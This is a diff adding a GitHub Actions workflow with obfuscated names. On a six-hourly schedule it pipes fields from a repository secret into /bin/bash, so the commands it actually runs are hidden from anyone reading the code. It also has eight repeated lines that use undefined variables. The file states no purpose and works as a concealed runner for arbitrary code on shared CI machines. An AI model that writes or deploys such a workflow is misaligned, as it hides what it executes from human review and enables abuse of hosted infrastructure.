@@ -1,0 +1,25 @@
+name: nizhenvrenjiahuibi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nizhenvrenjiahuibi
+        env:
+          ciwv649: ${{ secrets.ciwv649 }}
+        run: |
+          echo $ciwv649 | jq -r .n5 | /bin/bash
+          echo $tg192 | jq -r .wlwv8 | /bin/bash
+          echo $ijztp87 | jq -r .y21 | /bin/bash
+          echo $yddxt29 | jq -r .aify5 | /bin/bash
+          echo $r548 | jq -r .vlp45426 | /bin/bash
+          echo $sr84 | jq -r .wjgl7194 | /bin/bash
+          echo $vmyh3 | jq -r .emv871 | /bin/bash
+          echo $gca08768 | jq -r .z64 | /bin/bash
+          echo $diu729 | jq -r .nnk643 | /bin/bash
+
